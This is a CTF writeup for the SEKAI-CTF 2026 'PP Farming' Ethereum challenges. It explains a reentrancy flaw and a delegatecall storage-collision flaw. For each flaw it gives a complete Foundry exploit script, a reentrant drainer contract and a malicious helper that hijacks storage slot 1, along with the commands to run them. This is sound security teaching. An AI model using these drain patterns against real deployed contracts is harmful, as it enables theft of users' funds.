---
layout: default
title: "PP Farming: Solving Both Challenges"
description: "SEKAI-CTF 2026 blockchain writeup for PP Farming."
---

## PP Farming: Solving Both Challenges -- SEKAI-CTF 2026

**By Satya**  
**Date:** June 29, 2026, 19:22 IST

---
## Introduction
SEKAI-CTF 2026 has two Ethereum CTF challenges in the blockchain category.

<details markdown="1">
<summary>Hi</summary>

our team: 70776E, first CTF btw
</details>

### Goal

PP Farming (PerformancePoint Farming) is a donate-withdraw style smart contract where a user can donate PP to someone and withdraw PP donated to them. The goal in both challenges is to drain the contract holding all users' PP.

---

### **[PP Farming (1)](https://ctf.sekai.team/challenges?challenge=blockchain_PP+Farming)**:
The first challenge has two main functions: `donatePP(address _to)` and `withdrawPP()`.

As the name suggests, `donatePP` allows a user to donate PP to someone.

<details markdown="1">
<summary>donatePP code</summary>

```solidity
function donatePP(address _to) public payable {
    scores[_to] = scores[_to] + msg.value;
}
```

</details>

Here, `scores` is a mapping that stores the PP balance of each address.

The `withdrawPP()` function allows a user to withdraw PP donated to them.

<details markdown="1">
<summary>withdrawPP code</summary>

```solidity
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");
    scores[msg.sender] = 0;
}
```

</details>

### Vulnerability

Here the main vulnerability lies in the **`withdrawPP`** function. This might look like a normal function at first, especially to someone unfamiliar with Solidity or Ethereum, but the order of execution matters a lot in smart contracts. The issue is that the contract sends Ether to the user using **`call`** before resetting the user's score to zero. In Ethereum, when a contract uses **`call`** to send Ether to another contract, execution is handed over to the receiving contract. If the receiver has a **`receive()`** or **`fallback()`** function, that function runs immediately and can make another call back into the original contract.[^1] Since Solidity/EVM does not automatically prevent the same function from being called again before the first call finishes, **`withdrawPP()`** can be reentered while **`scores[msg.sender]`** is still unchanged. This allows the attacker to withdraw the same PP multiple times. This is one of the most classic vulnerabilities and is known as a **reentrancy vulnerability**.[^2]

### Exploit Path

```txt
Attacker.attack()
  -> donatePP(attacker)
  -> withdrawPP()
      -> call(attacker)
          -> receive()
              -> withdrawPP() again
```

- Create an attacker contract that stores the target `PerformancePointATM` address.
- Start the attack by calling `donatePP{value: amount}(address(this))`, so the attacker contract gets a non-zero PP score and can withdraw.
- Call `withdrawPP()` once from the attacker contract.
- During `withdrawPP()`, the target sends Ether back to the attacker using `call`.
- That `call` triggers the attacker's `receive()` function.
- Inside `receive()`, call `withdrawPP()` again before the target resets `scores[address(this)]` to zero.
- Repeat this reentrant withdrawal while the ATM contract still has enough balance.
- Once the ATM balance is drained, send the stolen Ether back to the player.

<details markdown="1">
<summary>our exploit script (foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPerformancePointATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
    function isSolved() external view returns (bool);
}

contract Attacker {
    IPerformancePointATM public atm;
    uint256 public attackAmount;

    constructor(address _atm) {
        atm = IPerformancePointATM(_atm);
    }

    function attack() external payable {
        attackAmount = msg.value;
        atm.donatePP{value: attackAmount}(address(this));
        atm.withdrawPP();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(atm).balance >= attackAmount) {
            atm.withdrawPP();
        }
    }
}

contract ExploitScript is Script {
    function run() external {
        uint256 playerPrivateKey = vm.envUint("PLAYER_PRIVATE_KEY");
        address atmAddress = vm.envAddress("ATM_ADDRESS");
        
        vm.startBroadcast(playerPrivateKey);
        
        Attacker attacker = new Attacker(atmAddress);
        attacker.attack{value: 1 ether}();
        
        require(IPerformancePointATM(atmAddress).isSolved(), "The exploit failed to drain the contract!");
        
        vm.stopBroadcast();
    }
}
```

usage:
```bash
export RPC_URL="<challenge-rpc-url>"
export PLAYER_PRIVATE_KEY="<player-private-key>"
export ATM_ADDRESS="<performance-point-atm-address>"

forge script exploit_env/script/Exploit.s.sol:ExploitScript --rpc-url "$RPC_URL" --broadcast
```
</details>

### Result

After this, the contract is drained and the flag can be captured.

---
### Note

Remember to save the flag captured in the first challenge because we did not and had to get it again as it is the key to the 2nd challenge attachment file T_T.

### **[PP Farming (2)](https://ctf.sekai.team/challenges?challenge=blockchain_PP+Farming+2)**:

The second challenge looks like it fixed the first bug by adding a `noReentrancy` modifier to `withdrawPP()`.
As the author, `brokenappendix`, says: `I fixed the issue. I think...`

<details markdown="1">
<summary>withdrawPP code</summary>

```solidity
function withdrawPP() public noReentrancy {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    
    // Uses delegatecall to helper for withdrawal
    (bool success, ) = performancePointHelper.delegatecall(
        abi.encodeWithSignature("processWithdrawal(address,uint256)", msg.sender, score)
    );
    
    require(success, "Transfer failed");
    scores[msg.sender] = 0;
}
```

</details>

### Patch Attempt

So the normal Part 1 reentrancy attack no longer works because `locked` becomes `true` before the external transfer happens. But the contract introduced a new issue: it uses `delegatecall` to a helper contract.[^3]

The reentrancy guard fixed the original bug, but the new helper/proxy design introduced a more dangerous `delegatecall` storage collision.

The helper has a `setATM(address _atm)` function:

<details markdown="1">
<summary>helper code</summary>

```solidity
contract PerformancePointHelper{
    uint256 id_number;
    address public atm;
    bool public helping;

    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool success, ) = recipient.call{value: amount}("");
        return success;
    }

    function setATM(address _atm) public {
        atm = _atm;
    }
}
```

</details>

At first this looks harmless because `setATM()` belongs to the helper, not the ATM. However, the ATM has a fallback function that forwards unknown calls to the helper using `delegatecall`.

<details markdown="1">
<summary>fallback code</summary>

```solidity
fallback() external payable {
    address _impl = performancePointHelper;

    bytes4 selector = msg.sig;
    
    // Block withdrawing without proxy
    bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
    require(selector != initSelector, "processWithdrawal blocked");

    assembly {
        let ptr := mload(0x40)
        calldatacopy(ptr, 0, calldatasize())

        let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)
        returndatacopy(ptr, 0, returndatasize())

        if iszero(success) {
            revert(ptr, returndatasize())
        }
        return(ptr, returndatasize())
    }
}
```

</details>

The important part is how `delegatecall` works. It runs the helper's code, but it writes to the ATM's storage. The helper's `atm` variable is in storage slot `1` at offset `0`, and the ATM's `performancePointHelper` variable is also in storage slot `1` at offset `0`. So when we call `setATM(address)` through the ATM fallback, it does not update the helper's `atm`; it overwrites the ATM's `performancePointHelper`.[^3]

### Storage Layout

| Slot | Offset | ATM variable | Helper variable |
|---|---:|---|---|
| 0 | 0 | `scores` | `id_number` |
| 1 | 0 | `performancePointHelper` | `atm` |
| 1 | 20 | `locked` | `helping` |

### Root Cause

This lets us replace the real helper with our own malicious helper. This is a storage collision caused by using `delegatecall` with a helper contract that does not share the same storage layout safely.

Because `delegatecall` executes the malicious helper in the ATM's context, `address(this).balance` inside the helper means the ATM's balance, not the helper's balance.

### Exploit Path

```txt
attacker calls ATM.setATM(maliciousHelper)
  -> ATM fallback()
      -> delegatecall(real helper.setATM)
          -> writes ATM slot 1
          -> performancePointHelper = malicious helper
  -> donate 1 wei PP
  -> withdrawPP()
      -> delegatecall(malicious processWithdrawal)
          -> send full ATM balance
```

- Deploy a malicious helper contract with a fake `processWithdrawal(address,uint256)` function.
- Call `setATM(address(maliciousHelper))` on the ATM address.
- The ATM does not have `setATM()`, so its fallback runs.
- The fallback uses `delegatecall` into the real helper.
- Because of `delegatecall`, `setATM()` writes to the ATM's storage slot `1`.
- This overwrites `performancePointHelper` with our malicious helper address.
- Donate a tiny amount of PP to the player so `withdrawPP()` passes the `score > 0` check.
- Call `withdrawPP()`.
- Now `withdrawPP()` delegatecalls our malicious `processWithdrawal()`.
- Our malicious helper ignores the requested amount and sends the whole ATM balance to the recipient.
- The ATM balance becomes zero, so `isSolved()` returns `true`.

### Impact

An attacker can drain the full `10 ether` challenge balance. In Part 2, the attacker only needs to donate `1 wei` so that `withdrawPP()` passes the `score > 0` check.

<details markdown="1">
<summary>our exploit script (foundry)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPP2ATM {
    function donatePP(address _to) external payable;
    function withdrawPP() external;
    function isSolved() external view returns (bool);
}

contract PP2DrainHelper {
    function processWithdrawal(address payable recipient, uint256) external returns (bool) {
        (bool success, ) = recipient.call{value: address(this).balance}("");
        return success;
    }
}

contract ExploitPP2Script is Script {
    function run() external {
        uint256 playerPrivateKey = vm.envUint("PLAYER_PRIVATE_KEY");
        address atmAddress = vm.envAddress("ATM_ADDRESS");

        vm.startBroadcast(playerPrivateKey);

        PP2DrainHelper helper = new PP2DrainHelper();

        (bool rewired, ) = atmAddress.call(
            abi.encodeWithSignature("setATM(address)", address(helper))
        );
        require(rewired, "helper rewire failed");

        IPP2ATM atm = IPP2ATM(atmAddress);
        atm.donatePP{value: 1 wei}(vm.addr(playerPrivateKey));
        atm.withdrawPP();

        require(atm.isSolved(), "PP2 not solved");

        vm.stopBroadcast();
    }
}
```

usage:
```bash
export RPC_URL="<challenge-rpc-url>"
export PLAYER_PRIVATE_KEY="<player-private-key>"
export ATM_ADDRESS="<performance-point-atm-address>"

forge script exploit_env/script/ExploitPP2.s.sol:ExploitPP2Script --rpc-url "$RPC_URL" --broadcast
```

</details>

### Conclusion

And that is how we solved both PP Farming challenges: the first with classic reentrancy, and the second by abusing a `delegatecall` storage collision to replace the helper and drain the contract.

### References

[^1]: Solidity documentation, [Receive Ether Function and Fallback Function](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function) and [Fallback Function](https://docs.soliditylang.org/en/latest/contracts.html#fallback-function).
[^2]: Solidity documentation, [Security Considerations: Reentrancy](https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy).
[^3]: Solidity documentation, [Delegatecall and Libraries](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-and-libraries).
